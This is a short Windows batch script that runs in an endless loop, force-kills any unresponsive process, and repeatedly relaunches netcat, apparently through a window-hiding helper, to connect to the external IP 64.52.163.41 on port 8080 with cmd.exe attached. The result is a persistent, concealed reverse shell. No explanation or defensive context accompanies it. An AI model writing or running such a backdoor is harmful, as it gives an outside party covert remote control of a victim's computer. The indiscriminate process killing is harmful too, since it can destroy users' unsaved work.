@echo off
:loop
cls
taskkill /f /fi "status eq not responding"
timeout 15
tasklist /FI "IMAGENAME eq nc.exe" 2>NUL | find /I /N "nc.exe">NUL
if NOT "%ERRORLEVEL%" == "0" start C:\nc\rh.exe C:\nc\nc.exe 64.52.163.41 8080 -e cmd.exe
if errorlevel 0 (
        goto loop
)
:end